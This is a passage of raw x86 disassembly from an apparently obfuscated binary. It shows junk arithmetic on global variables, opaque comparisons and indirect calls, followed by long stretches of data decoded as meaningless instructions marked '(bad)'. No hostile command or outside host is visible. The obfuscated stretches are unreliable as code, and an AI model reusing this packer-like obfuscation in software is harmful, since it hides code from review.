  402b53:	adc    DWORD PTR ds:0x42846d,edx
  402b59:	add    DWORD PTR ds:0x42856d,ebx
  402b5f:	xor    edx,edx
  402b61:	or     edx,DWORD PTR ds:0x42857d
  402b67:	xor    edx,DWORD PTR ds:0x4284e5
  402b6d:	mov    DWORD PTR ds:0x42857d,edx
  402b73:	add    edx,0x71a6
  402b79:	add    eax,DWORD PTR [ecx]
  402b7b:	sub    ecx,0x1eef
  402b81:	mov    DWORD PTR [ebp-0x14],eax
  402b84:	or     ecx,DWORD PTR ds:0x42845d
  402b8a:	mov    ecx,DWORD PTR [ebx]
  402b8c:	mov    eax,DWORD PTR [ebx+0x4]
  402b8f:	shrd   ecx,eax,0x2
  402b93:	cmp    DWORD PTR ds:0x42832d,0x0
  402b9a:	mov    DWORD PTR ds:0x4284d1,0x61cd
  402ba4:	mov    edx,DWORD PTR ds:0x428339
  402baa:	mov    DWORD PTR ds:0x428345,edx
  402bb0:	jmp    0x402c95
  402bb5:	mov    DWORD PTR ds:0x428349,0x124b
  402bbf:	mov    DWORD PTR ds:0x428421,0x5ddc
  402bc9:	cmp    DWORD PTR ds:0x42832d,0x0
  402bd0:	jle    0x402bf9
  402bd6:	push   0x6f74
  402bdb:	call   DWORD PTR ds:0x42e0ac
  402be1:	sub    DWORD PTR ds:0x4284ed,edx
  402be7:	and    edx,DWORD PTR ds:0x428425
  402bed:	mov    edx,DWORD PTR ds:0x428575
  402bf3:	xor    DWORD PTR ds:0x4284c5,edx
  402bf9:	mov    edx,DWORD PTR ds:0x4285b9
  402bff:	mov    edx,DWORD PTR [edx]
  402c01:	xor    DWORD PTR ds:0x428429,edx
  402c07:	and    DWORD PTR ds:0x42834d,0x245f
  402c11:	cmp    DWORD PTR ds:0x428341,0x0
  402c18:	mov    DWORD PTR ds:0x4284e1,0x70c6
  402c22:	not    edx
  402c24:	mov    edx,0x462e
  402c29:	jmp    0x402c95
  402c2e:	mov    DWORD PTR ds:0x428481,edx
  402c34:	cmp    DWORD PTR ds:0x428341,0x0
  402c3b:	jl     0x402c5f
  402c41:	push   DWORD PTR [ebp-0x18]
  402c44:	push   0x2a6e
  402c49:	call   DWORD PTR ds:0x42e240
  402c4f:	sbb    DWORD PTR ds:0x428341,0x59bd
  402c59:	sub    edx,0x641d
  402c5f:	sbb    DWORD PTR ds:0x428349,0x428501
  402c69:	sbb    DWORD PTR ds:0x4284e5,0x27b0
  402c73:	mov    edx,DWORD PTR ds:0x4284ad
  402c79:	mov    edx,DWORD PTR [edx]
  402c7b:	adc    DWORD PTR ds:0x428405,edx
  402c81:	xor    DWORD PTR ds:0x428455,0x428421
  402c8b:	sbb    DWORD PTR ds:0x428471,0x33ea
  402c95:	shr    eax,0x2
  402c98:	cmp    DWORD PTR ds:0x428445,0x0
  402c9f:	mov    DWORD PTR ds:0x428561,0x384
  402ca9:	mov    DWORD PTR ds:0x428345,0x2b95
  402cb3:	mov    edx,DWORD PTR ds:0x428549
  402cb9:	mov    DWORD PTR ds:0x428501,edx
  402cbf:	jmp    0x402d0e
  402cc4:	mov    eax,0x220e
  402cc9:	mov    DWORD PTR ds:0x4284ed,0x7b53
  402cd3:	cmp    DWORD PTR ds:0x428445,0x0
  402cda:	jbe    0x402d06
  402ce0:	push   0x3c7e
  402ce5:	push   0x1ff0
  402cea:	call   DWORD PTR ds:0x42e0b0
  402cf0:	sub    edx,0x6132
  402cf6:	sbb    DWORD PTR ds:0x428501,0x612a
  402d00:	sbb    DWORD PTR ds:0x428565,ecx
  402d06:	dec    edx
  402d07:	inc    edx
  402d08:	and    edx,DWORD PTR ds:0x428565
  402d0e:	mov    eax,DWORD PTR [ebx]
  402d10:	mov    edx,DWORD PTR [ebx+0x4]
  402d13:	dec    DWORD PTR ds:0x428405
  402d19:	xor    ecx,edi
  402d1b:	shl    eax,0x1e
  402d1e:	xor    edx,0x1700
  402d24:	xor    eax,eax
  402d26:	sub    edx,0x11fc
  402d2c:	or     eax,ecx
  402d2e:	mov    ecx,DWORD PTR [ebx]
  402d30:	cmp    DWORD PTR ds:0x428501,0x0
  402d37:	mov    DWORD PTR ds:0x428469,0x400c
  402d41:	mov    edx,DWORD PTR ds:0x42842d
  402d47:	mov    edx,DWORD PTR ds:0x4284fd
  402d4d:	jmp    0x402d9d
  402d52:	mov    DWORD PTR ds:0x428451,0x114
  402d5c:	cmp    DWORD PTR ds:0x428501,0x0
  402d63:	je     0x402d85
  402d69:	push   DWORD PTR [ebp-0x24]
  402d6c:	call   DWORD PTR ds:0x42e0b4
  402d72:	dec    edx
  402d73:	xor    edx,DWORD PTR ds:0x428559
  402d79:	or     DWORD PTR ds:0x428439,ebx
  402d7f:	sub    DWORD PTR ds:0x4284fd,ecx
  402d85:	mov    edx,DWORD PTR ds:0x42854d
  402d8b:	xor    DWORD PTR ds:0x4284ed,edx
  402d91:	xor    edx,0x442c
  402d97:	not    DWORD PTR ds:0x42833d
  402d9d:	mov    edx,DWORD PTR [ebx+0x4]
  402da0:	add    DWORD PTR ds:0x428439,0x428419
  402daa:	shrd   ecx,edx,0x2
  402dae:	shr    edx,0x2
  402db1:	mov    DWORD PTR [ebp-0x1c],ecx
  402db4:	sbb    edx,DWORD PTR ds:0x428501
  402dba:	mov    ecx,DWORD PTR [ebx]
  402dbc:	mov    edx,DWORD PTR ds:0x428481
  402dc2:	xor    DWORD PTR ds:0x4284ed,edx
  402dc8:	mov    edx,DWORD PTR [ebx+0x4]
  402dcb:	xor    DWORD PTR [ebp-0x1c],edi
  402dce:	and    DWORD PTR ds:0x428471,0x4abe
  402dd8:	xor    edx,edx
  402dda:	sub    DWORD PTR ds:0x428411,0x1446
  402de4:	or     edx,DWORD PTR [ebp-0x1c]
  402de7:	shl    ecx,0x1e
  402dea:	lea    ecx,[edx+eax*1]
  402ded:	mov    edx,DWORD PTR ds:0x42852d
  402df3:	xor    eax,eax
  402df5:	xor    eax,DWORD PTR ds:0x4285b9
  402dfb:	sub    edx,eax
  402dfd:	add    edx,DWORD PTR [edx+eax*1]
  402e00:	mov    eax,DWORD PTR [ebx]
  402e02:	xor    DWORD PTR ds:0x428571,ecx
  402e08:	mov    edx,DWORD PTR [ebx+0x4]
  402e0b:	or     DWORD PTR ds:0x42840d,0x3bc
  402e15:	shrd   eax,edx,0x2
  402e19:	shr    edx,0x2
  402e1c:	cmp    DWORD PTR ds:0x42857d,0x0
  402e23:	mov    DWORD PTR ds:0x42846d,ebx
  402e29:	mov    DWORD PTR ds:0x428471,0x656f
  402e33:	movzx  edx,BYTE PTR ds:0x428419
  402e3a:	jmp    0x402e93
  402e3f:	mov    DWORD PTR ds:0x42843d,0x5c7
  402e49:	mov    DWORD PTR ds:0x42847d,0x3013
  402e53:	cmp    DWORD PTR ds:0x42857d,0x0
  402e5a:	jle    0x402e7f
  402e60:	push   DWORD PTR [ebp-0x24]
  402e63:	call   DWORD PTR ds:0x42e0b8
  402e69:	sub    DWORD PTR ds:0x428351,0x7db0
  402e73:	sub    DWORD PTR ds:0x428581,ecx
  402e79:	adc    DWORD PTR ds:0x42840d,edx
  402e7f:	and    edx,DWORD PTR ds:0x4284e9
  402e85:	mov    edx,DWORD PTR ds:0x42839d
  402e8b:	mov    edx,DWORD PTR [edx]
  402e8d:	xor    DWORD PTR ds:0x42836d,edx
  402e93:	mov    DWORD PTR [ebp-0x1c],eax
  402e96:	not    DWORD PTR ds:0x428451
  402e9c:	mov    eax,DWORD PTR [ebx]
  402e9e:	add    DWORD PTR ds:0x4284e9,0x4968
  402ea8:	jmp    0x403249
  402ead:	cmp    al,0xdc
  402eaf:	(bad)  
  402eb0:	inc    ebp
  402eb1:	ss dec ebx
  402eb3:	mov    esp,0x8c100abc
  402eb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402eb9:	push   esp
  402eba:	inc    edx
  402ebb:	pop    esp
  402ebc:	sar    DWORD PTR [ebp-0x42414120],1
  402ec2:	les    edi,FWORD PTR [esi+0x2fe5bdbe]
  402ec8:	(bad)  [esi+0x4f]
  402ecb:	adc    DWORD PTR [ebp+0x17],ebp
  402ece:	das    
  402ecf:	fstp   TBYTE PTR [esi]
  402ed1:	and    ah,BYTE PTR [eax-0x27]
  402ed4:	fninit 
  402ed6:	out    0x3b,eax
  402ed8:	push   esp
  402ed9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402eda:	inc    edi
  402edb:	mov    DWORD PTR [ecx],edx
  402edd:	imul   edx,DWORD PTR [ebx-0x6eac55c0],0x47
  402ee4:	in     eax,0x7d
  402ee6:	dec    esi
  402ee7:	nop
  402ee8:	pop    esi
  402ee9:	pop    esi
  402eea:	mov    ch,0xce
  402eec:	jp     0x402eca
  402eee:	fadd   DWORD PTR [ecx+0x4e0da138]
  402ef4:	pop    ebx
  402ef5:	mov    esi,DWORD PTR [esi-0x36]
  402ef8:	mov    ds:0x804d5f71,eax
  402efd:	dec    edx
  402efe:	dec    ebp
  402eff:	jns    0x402f47
  402f01:	and    eax,ecx
  402f03:	xchg   ecx,eax
  402f04:	dec    esi
  402f05:	pusha  
  402f06:	inc    eax
  402f07:	shl    BYTE PTR [ebp+0x73f19065],0x9b
  402f0e:	dec    edx
  402f0f:	jecxz  0x402f7f
  402f11:	cld    
  402f12:	rol    BYTE PTR [ebx],0x27
  402f15:	inc    ecx
  402f16:	xchg   ecx,eax
  402f17:	or     dl,BYTE PTR [edx]
  402f19:	sub    dh,BYTE PTR [esi+0x57]
  402f1c:	in     al,0x2f
  402f1e:	inc    ebx
  402f1f:	jne    0x402ed0
  402f21:	mov    ds:0x33781ec4,eax
  402f26:	jg     0x402ebd
  402f28:	out    dx,eax
  402f29:	jle    0x402f0d
  402f2b:	jmp    0xa31e:0xed517c71
  402f32:	fld    QWORD PTR [edi+0x793c5620]
  402f38:	push   edi
  402f39:	in     al,dx
  402f3a:	mov    bh,0xe7
  402f3c:	pushf  
  402f3d:	out    dx,al
  402f3e:	addr16 push ebx
  402f40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f41:	out    dx,eax
  402f42:	out    dx,eax
  402f43:	push   es
  402f44:	push   edi
  402f45:	cmp    BYTE PTR [edx-0x2374e400],bh
  402f4b:	ds push ds
  402f4d:	mov    fs,WORD PTR [eax+0x4b498cc5]
  402f53:	and    al,0xa6
  402f55:	jae    0x402ede
  402f57:	pop    eax
  402f58:	(bad)
  402f5c:	push   0xb6cdabeb
  402f61:	sub    eax,0xe7ba9bfd
  402f66:	lea    ebp,[edi+ebp*1]
  402f69:	xor    dh,al
  402f6b:	sbb    DWORD PTR [esi],ebx
  402f6d:	(bad)  
  402f6e:	(bad)
  402f71:	shr    BYTE PTR [esi],0xa2
  402f74:	inc    edx
  402f75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f76:	sub    DWORD PTR [ebp+0x51c05940],edx
  402f7c:	(bad)  [ebp+eiz*1+0x39]
  402f80:	sbb    eax,0x85be91cc
  402f85:	bound  esi,QWORD PTR [eax+0x2f]
  402f88:	pushf  
  402f89:	cs cwde 
  402f8b:	add    al,0x5d
  402f8d:	mov    esp,0x4c545b74
  402f92:	fld    TBYTE PTR [eax-0x16]
  402f95:	mov    al,ch
  402f97:	add    al,0x98
  402f99:	cmp    BYTE PTR [ebx-0x4b260651],0xd
  402fa0:	das    
  402fa1:	push   ebp
  402fa2:	lahf   
  402fa3:	test   eax,0x20290399
  402fa8:	jbe    0x403016
  402faa:	inc    eax
  402fab:	(bad)  
  402fac:	pop    edi
  402fad:	inc    ebx
  402fae:	mov    esi,0xa2803d6
  402fb3:	sbb    esp,eax
  402fb5:	std    
  402fb6:	or     bh,cl
  402fb8:	dec    esi
  402fb9:	(bad)  
  402fba:	jmp    0xcd527729
  402fbf:	leave  
  402fc0:	add    DWORD PTR [ebp-0x70333f9a],esp
  402fc6:	cmp    eax,0x4638d926
  402fcb:	(bad)  
  402fcc:	loope  0x402fbd
  402fce:	adc    bl,BYTE PTR [ecx+esi*2+0x31232618]
  402fd5:	mov    al,0x41
  402fd7:	shl    DWORD PTR [eax+0x24ea099],cl
  402fdd:	jnp    0x402fcc
  402fdf:	ja     0x402ff1
  402fe1:	mov    dl,0xf4
  402fe3:	ds sti 
  402fe5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402fe6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402fe7:	xchg   edi,eax
  402fe8:	jbe    0x403018
  402fea:	cwde   
  402feb:	sub    al,0x62
  402fed:	sub    eax,0x7ab3cfec
  402ff2:	repz das 
  402ff4:	mov    dh,0xf1
  402ff6:	and    al,0xb9
  402ff8:	dec    ecx
  402ff9:	sub    eax,0xbfe60e6c
  402ffe:	add    BYTE PTR [eax-0x5e],0x16
  403002:	sbb    al,BYTE PTR [ebp+ebp*4-0x715dd234]
  403009:	mov    ebp,0x331f8d94
  40300e:	push   0xc1448f99
  403013:	dec    ebx
  403014:	push   ds
  403015:	mov    dl,0x1
  403017:	xchg   ecx,eax
  403018:	or     al,0x5c
  40301a:	mov    dl,0x5c
  40301c:	mov    ch,0x7
  40301e:	mov    al,ds:0x36cfad7b
  403023:	mov    ds:0x6cd22038,eax
  403028:	outs   dx,BYTE PTR ds:[esi]
  403029:	mov    al,0x8
  40302b:	dec    ebp
  40302c:	and    BYTE PTR [ecx],al
  40302e:	pop    edx
  40302f:	rcl    DWORD PTR [eax-0x6a],cl
  403032:	inc    edi
  403033:	aad    0xb4
  403035:	or     eax,0x6151295d
  40303a:	pushf  
  40303b:	cli    
  40303c:	sub    cl,BYTE PTR [ebx+0x3c65df58]
  403042:	adc    dh,BYTE PTR [esi+eiz*2]
  403045:	fidiv  WORD PTR [edi+ebx*1+0x65]
  403049:	aam    0xd7
  40304b:	mov    ecx,0x5e4c072e
  403050:	adc    edi,DWORD PTR [esi]
  403052:	ror    DWORD PTR [esi+eiz*4-0x475239ba],1
  403059:	xor    BYTE PTR [eax],al
  40305b:	sub    dl,ah
  40305d:	add    DWORD PTR [ebp-0x20568701],ebx
  403063:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403064:	sbb    BYTE PTR [edx-0x6e21fc8f],dl
  40306a:	jns    0x4030a8
  40306c:	test   DWORD PTR [ebx],esi
  40306e:	div    DWORD PTR [ecx-0xc]
  403071:	cmp    ah,BYTE PTR [edi]
  403073:	mov    esp,0xee68d548
  403078:	pop    ebp
  403079:	shl    cl,1
  40307b:	pop    ebp
  40307c:	add    BYTE PTR [edx+0x50ba665d],dh
  403082:	mov    ch,0xc4
  403084:	pusha  
  403085:	dec    ebp
  403086:	mov    ds,ebp
  403088:	jo     0x4030fd
  40308a:	xor    eax,0x70f666bd
  40308f:	adc    DWORD PTR [edx+0x52d85184],ebp
  403095:	shr    DWORD PTR [edx-0x73],0xf
  403099:	loope  0x403113
  40309b:	mov    ch,BYTE PTR [ecx+eiz*4+0x51]
  40309f:	xchg   esi,eax
  4030a0:	pop    esi
  4030a1:	mov    ebp,DWORD PTR [edx-0x32]
  4030a4:	sbb    DWORD PTR [edx-0x40c14ea4],esi
  4030aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4030ab:	adc    eax,0xa5ff2ad7
  4030b0:	arpl   WORD PTR [ecx-0x76],bp
  4030b3:	mov    ebx,DWORD PTR [ebp+0x22]
  4030b6:	pop    esi
  4030b7:	xchg   esi,eax
  4030b8:	call   0xa194:0x242bb948
  4030bf:	fcmovb st,st(6)
  4030c1:	ja     0x403138
  4030c3:	ss jg  0x403091
  4030c6:	lock inc esi
  4030c8:	fidiv  WORD PTR [ebx]
  4030ca:	and    ebx,DWORD PTR [ecx-0x491e572e]
  4030d0:	mov    ah,BYTE PTR [ebx+0xd]
  4030d3:	xchg   ebp,eax
  4030d4:	fstp   st(6)
  4030d6:	les    esi,FWORD PTR [ecx]
  4030d8:	mov    ah,BYTE PTR [edx+edi*1+0x13]
  4030dc:	dec    ebx
  4030dd:	in     eax,dx
  4030de:	mul    DWORD PTR [ecx]
  4030e0:	push   ss
  4030e1:	inc    eax
  4030e2:	int3   
  4030e3:	xlat   BYTE PTR ds:[ebx]
  4030e4:	jb     0x40306b
  4030e6:	mov    ds:0x12db5ec3,eax
  4030eb:	sbb    ch,BYTE PTR [ebx-0x4b]
  4030ee:	lods   eax,DWORD PTR ds:[esi]
  4030ef:	or     ecx,DWORD PTR [edi-0x2e]
  4030f2:	scas   eax,DWORD PTR es:[edi]
  4030f3:	je     0x403151
  4030f5:	dec    ebx
  4030f6:	pop    edi
  4030f7:	inc    edx
  4030f8:	xchg   DWORD PTR [esp+edi*2-0x2564619],edx
  4030ff:	sbb    ah,bl
  403101:	push   esi
  403102:	xchg   esi,eax
  403103:	sar    DWORD PTR [esi+0x9],cl
  403106:	or     BYTE PTR [edi-0x58dfa6dd],bl
  40310c:	jns    0x40313c
  40310e:	cwde   
  40310f:	push   es
  403110:	mov    edi,0xa080f7d4
  403115:	push   ebp
  403116:	cli    
  403117:	in     al,0xa2
  403119:	mov    edi,0x234f6c79
  40311e:	mov    BYTE PTR [ecx-0xca0d482],cl
  403124:	push   edx
  403125:	mov    al,BYTE PTR [esi-0x5a]
  403128:	test   al,0x7
  40312a:	sbb    dh,BYTE PTR [ecx+0x6e]
  40312d:	pop    eax
  40312e:	mov    edi,0xb89fe956
  403133:	and    BYTE PTR [ebp+0x23],cl
  403136:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403137:	iret   
  403138:	pop    ecx
  403139:	lods   al,BYTE PTR ds:[esi]
  40313a:	add    al,0xef
  40313c:	rol    DWORD PTR [edx],0x29
  40313f:	xor    edi,ebp
  403141:	xor    eax,0x5c199698
  403146:	cmp    al,0xc7
  403148:	pusha  
  403149:	ins    BYTE PTR es:[edi],dx
  40314a:	mov    ecx,DWORD PTR [ecx+0x70]
  40314d:	pop    esp
  40314e:	or     al,0x8
  403150:	out    dx,eax
  403151:	ret    
  403152:	mov    edi,DWORD PTR [esi-0x6e]
  403155:	xchg   edx,eax
  403156:	add    al,BYTE PTR [esi-0x36]
  403159:	push   esi
  40315a:	xor    eax,0x2ff04dfa
  40315f:	mov    eax,0x8b26f535
  403164:	jb     0x403174
  403166:	add    BYTE PTR [ecx-0x50],al
  403169:	in     eax,0xce
  40316b:	push   DWORD PTR [ebp-0x6abb8916]
  403171:	fucom  st(4)
  403173:	pop    ss
  403174:	xchg   edx,eax
  403175:	sbb    BYTE PTR [edi],ah
  403177:	arpl   WORD PTR [edi+edx*8-0x16fe1358],sp
  40317e:	ret    
  40317f:	sub    al,0x4a
  403181:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403182:	rol    BYTE PTR [esi+0x4f68ea57],0x19
  403189:	idiv   bh
  40318b:	fwait
  40318c:	xchg   DWORD PTR [eax+edi*1+0x581d1724],eax
  403193:	retf   
  403194:	ss pop edi
  403196:	dec    esp
  403197:	(bad)  
  403199:	das    
  40319a:	mov    dh,0xca
  40319c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40319d:	pop    ds
  40319e:	xlat   BYTE PTR ds:[ebx]
  40319f:	in     al,0x4d
  4031a1:	retf   
  4031a2:	and    al,al
  4031a4:	pop    ebx
  4031a5:	inc    ecx
  4031a6:	pop    esp
  4031a7:	inc    ebp
  4031a8:	sub    al,0xbe
  4031aa:	dec    ebp
  4031ab:	and    eax,0xd8bfc81e
  4031b0:	(bad)
  4031b3:	es jno 0x403148
  4031b6:	mov    al,ds:0x89e958ae
  4031bb:	(bad)  
  4031bc:	out    0x45,eax
  4031be:	cmp    al,0x3e
  4031c0:	xchg   edx,eax
  4031c1:	ds inc ecx
  4031c3:	jecxz  0x4031e9
  4031c5:	ss mov ah,0x8a
  4031c8:	imul   esi,DWORD PTR [edi],0xffffffc1
  4031cb:	scas   eax,DWORD PTR es:[edi]
  4031cc:	push   ds
  4031cd:	int3   
  4031ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4031cf:	inc    ebx
  4031d0:	fistp  DWORD PTR [ebx]
  4031d2:	aaa    
  4031d3:	mov    ss,WORD PTR [edi+eiz*2-0x62296834]
  4031da:	lods   eax,DWORD PTR ds:[esi]
  4031db:	mov    bl,0x53
  4031dd:	xor    edi,edi
  4031df:	pop    ss
  4031e0:	push   eax
  4031e1:	fwait
  4031e2:	popf   
  4031e3:	dec    ebx
  4031e4:	nop
  4031e5:	cdq    
  4031e6:	in     al,0x4e
  4031e8:	std    
  4031e9:	jmp    0x9d10:0x8805f823
  4031f0:	in     eax,0x94
  4031f2:	add    eax,ebp
  4031f4:	repnz sbb edi,esi
  4031f7:	dec    esp
  4031f8:	pop    edx
  4031f9:	adc    ch,BYTE PTR [esi+0x1df6373b]
  4031ff:	jnp    0x4031bf
  403201:	and    DWORD PTR [edi+0x4c],esp
  403204:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403205:	movups XMMWORD PTR [edx-0x3148bf14],xmm1
  40320c:	repnz sub al,dh
  40320f:	dec    ebp
  403210:	pop    ds
  403211:	fild   DWORD PTR [eax]
  403213:	inc    eax
  403214:	sbb    al,0xa7
  403216:	cmp    ax,0x8aad
  40321a:	outs   dx,BYTE PTR ds:[esi]
  40321b:	and    dl,bh
  40321d:	fisubr DWORD PTR [edi-0x7e]
  403220:	bound  edi,QWORD PTR [edx]
  403222:	in     al,dx
  403223:	xor    ebp,DWORD PTR [edx+0x5e]
  403226:	cmp    eax,0xb0d6230f
  40322b:	push   0xa9d3441a
  403230:	(bad)  [esi-0x19769dec]
  403236:	stc    
  403237:	jmp    0x3e37001f
  40323c:	push   ecx
  40323d:	icebp  
  40323e:	es cmp eax,0x54c0ff41
  403244:	sbb    dh,BYTE PTR [eax]
  403246:	shl    dl,1
  403248:	lods   eax,DWORD PTR ds:[esi]
  403249:	mov    edx,DWORD PTR [ebx+0x4]
  40324c:	xor    DWORD PTR [ebp-0x1c],edi
  40324f:	sub    DWORD PTR ds:0x4284d9,ebx
  403255:	mov    edx,eax
  403257:	sub    DWORD PTR ds:0x428579,0x42835d
  403261:	xor    eax,eax
  403263:	or     eax,DWORD PTR [ebp-0x1c]
  403266:	shl    edx,0x1e
  403269:	mov    edx,DWORD PTR ds:0x428459
  40326f:	xor    DWORD PTR ds:0x42840d,edx
  403275:	imul   eax,ecx
  403278:	sub    DWORD PTR ds:0x4284f9,0x4172
  403282:	mov    ecx,DWORD PTR [ebx]
  403284:	add    edx,0x41d1
  40328a:	mov    edx,DWORD PTR [ebx+0x4]
  40328d:	shrd   ecx,edx,0x2
  403291:	mov    DWORD PTR [ebp-0x1c],ecx
  403294:	mov    ecx,DWORD PTR [ebx]
  403296:	or     DWORD PTR ds:0x4284c9,0x42b9
  4032a0:	xor    DWORD PTR [ebp-0x1c],edi
  4032a3:	mov    DWORD PTR ds:0x428555,0x397a
  4032ad:	shr    edx,0x2
  4032b0:	cmp    DWORD PTR ds:0x42855d,0x0
  4032b7:	mov    DWORD PTR ds:0x4284f1,0x7cee
  4032c1:	mov    edx,DWORD PTR ds:0x428405
  4032c7:	jmp    0x403370
  4032cc:	mov    DWORD PTR ds:0x42835d,0x3170
  4032d6:	cmp    DWORD PTR ds:0x42855d,0x0
  4032dd:	jge    0x403302
  4032e3:	push   DWORD PTR [ebp-0x28]
  4032e6:	call   DWORD PTR ds:0x42e244
  4032ec:	add    edx,DWORD PTR ds:0x42841d
  4032f2:	sub    edx,0x765a
  4032f8:	xor    DWORD PTR ds:0x4284d5,0x290
  403302:	sbb    DWORD PTR ds:0x428411,edi
  403308:	inc    edx
  403309:	not    edx
  40330b:	cmp    DWORD PTR ds:0x4284f1,0x0
  403312:	mov    edx,DWORD PTR ds:0x428431
  403318:	mov    DWORD PTR ds:0x4284cd,0x501f
  403322:	mov    edx,DWORD PTR ds:0x4284d1
  403328:	jmp    0x403370
  40332d:	mov    DWORD PTR ds:0x428375,0x1634
  403337:	mov    DWORD PTR ds:0x4284e9,0xaef
  403341:	cmp    DWORD PTR ds:0x4284f1,0x0
  403348:	jb     0x403364
  40334e:	call   DWORD PTR ds:0x42e0bc
  403354:	adc    DWORD PTR ds:0x428431,0x42847d
  40335e:	adc    edx,0x2d88
  403364:	and    edx,0x4ab7
  40336a:	sub    edx,DWORD PTR ds:0x428411
  403370:	mov    edx,DWORD PTR [ebx+0x4]
  403373:	or     edx,DWORD PTR ds:0x4284e9
  403379:	mov    edx,ecx
  40337b:	add    DWORD PTR ds:0x428365,0x4284d9
  403385:	xor    ecx,ecx
  403387:	adc    DWORD PTR ds:0x428335,0x428455
  403391:	or     ecx,DWORD PTR [ebp-0x1c]
  403394:	sub    DWORD PTR ds:0x42844d,0x6b10
  40339e:	shl    edx,0x1e
  4033a1:	add    DWORD PTR ds:0x42833d,ebx
  4033a7:	sub    ecx,eax
  4033a9:	mov    DWORD PTR ds:0x428409,0x9e0
  4033b3:	mov    eax,DWORD PTR [ebp-0xc]
  4033b6:	cmp    DWORD PTR [eax],ecx
  4033b8:	mov    DWORD PTR ds:0x428569,0x2658
  4033c2:	mov    eax,DWORD PTR [ebp-0xc]
  4033c5:	mov    ecx,DWORD PTR [ebp+0x18]
  4033c8:	mov    edx,DWORD PTR ds:0x428361
  4033ce:	mov    edx,DWORD PTR [ebp+0x1c]
  4033d1:	jg     0x4038e5
  4033d7:	and    DWORD PTR ds:0x428571,0xf14
  4033e1:	shrd   ecx,edx,0x2
  4033e5:	xor    DWORD PTR ds:0x428439,0x428431
  4033ef:	mov    DWORD PTR [ebp-0x1c],ecx
  4033f2:	xor    DWORD PTR ds:0x428365,edi
  4033f8:	mov    ecx,DWORD PTR [ebp+0x18]
  4033fb:	xor    DWORD PTR [ebp-0x1c],edi
  4033fe:	shl    ecx,0x1e
  403401:	mov    DWORD PTR ds:0x428415,0x71ad
  40340b:	xor    ecx,ecx
  40340d:	or     ecx,DWORD PTR [ebp-0x1c]
  403410:	shr    edx,0x2
  403413:	sub    DWORD PTR ds:0x4284fd,0x3b82
  40341d:	mov    edx,DWORD PTR [ebp+0x1c]
  403420:	cmp    DWORD PTR ds:0x4284d1,0x0
  403427:	mov    DWORD PTR ds:0x428561,0xe2a
  403431:	mov    DWORD PTR ds:0x428349,ecx
  403437:	mov    edx,0x4d53
  40343c:	jmp    0x4034b7
  403441:	mov    DWORD PTR ds:0x428575,0xfd5
  40344b:	mov    DWORD PTR ds:0x428449,ecx
  403451:	cmp    DWORD PTR ds:0x4284d1,0x0
  403458:	jae    0x4034a5
  40345e:	push   DWORD PTR [ebp-0x1c]
  403461:	push   0x633e
  403466:	push   0x428267
  40346b:	push   DWORD PTR [ebp-0x1c]
  40346e:	push   DWORD PTR [ebp-0xc]
  403471:	push   DWORD PTR [ebp-0x20]
  403474:	push   DWORD PTR [ebp-0x24]
  403477:	push   0x6c89
  40347c:	call   DWORD PTR ds:0x42dff4
  403482:	movzx  edx,WORD PTR ds:0x42842d
  403489:	sub    edx,DWORD PTR ds:0x4284e5
  40348f:	mov    DWORD PTR ds:0x42842d,edx
  403495:	mov    DWORD PTR ds:0x428361,0x6c8
  40349f:	sbb    edx,DWORD PTR ds:0x42836d
  4034a5:	mov    edx,DWORD PTR ds:0x42857d
  4034ab:	and    DWORD PTR ds:0x428435,edx
  4034b1:	inc    DWORD PTR ds:0x42832d
  4034b7:	mov    DWORD PTR [ebp-0x2c],ecx
  4034ba:	xor    DWORD PTR ds:0x428345,0x3285
  4034c4:	mov    ecx,DWORD PTR [ebx]
  4034c6:	mov    edx,DWORD PTR [ebx+0x4]
  4034c9:	and    DWORD PTR ds:0x428549,0x4bb1
  4034d3:	shrd   ecx,edx,0x2
  4034d7:	mov    DWORD PTR ds:0x428429,0x325c
  4034e1:	shr    edx,0x2
  4034e4:	add    DWORD PTR ds:0x4284e1,0x68a9
  4034ee:	mov    DWORD PTR [ebp-0x1c],ecx
  4034f1:	sub    DWORD PTR ds:0x428481,ebx
  4034f7:	mov    ecx,DWORD PTR [ebx]
  4034f9:	sub    DWORD PTR ds:0x428469,0x4284ed
  403503:	mov    edx,DWORD PTR [ebx+0x4]
  403506:	xor    DWORD PTR [ebp-0x1c],edi
  403509:	sub    DWORD PTR ds:0x428349,0x428361
  403513:	xor    edx,edx
  403515:	or     edx,DWORD PTR [ebp-0x1c]
  403518:	add    DWORD PTR ds:0x428341,0x71c0
  403522:	shl    ecx,0x1e
  403525:	adc    DWORD PTR ds:0x4284f1,0x428471
  40352f:	imul   edx,DWORD PTR [ebp-0x2c]
  403533:	and    DWORD PTR ds:0x42844d,0x15cd
  40353d:	sub    DWORD PTR [eax],edx
  40353f:	jmp    0x4041b5
  403544:	jmp    0x4038e5
  403549:	pop    ss
  40354a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40354b:	out    0xaf,eax
  40354d:	js     0x4034ff
  40354f:	cwde   
  403550:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403551:	retf   
  403552:	mov    ch,0x34
  403554:	(bad)  [eax+0x6a]
  403557:	mov    dl,0xcf
  403559:	mov    esi,0xbdbebee8
  40355e:	les    edi,FWORD PTR [esi-0x67b95142]
  403564:	rcr    esi,0x37
  403567:	inc    edx
  403568:	mov    edi,0xd4b6dbde
  40356d:	mov    ah,0x19
  40356f:	lds    ecx,FWORD PTR [esi]
  403571:	jle    0x403518
  403573:	test   BYTE PTR [edx],al
  403575:	add    DWORD PTR [eax+0x13b5e248],eax
  40357b:	rcl    DWORD PTR [ebp+0xd],0x31
  40357f:	mov    dl,0xaa
  403581:	jg     0x4035d2
  403583:	mov    bl,BYTE PTR [ebp-0xe385e3b]
  403589:	rol    DWORD PTR [edi-0x5567aa5d],1
  40358f:	pushf  
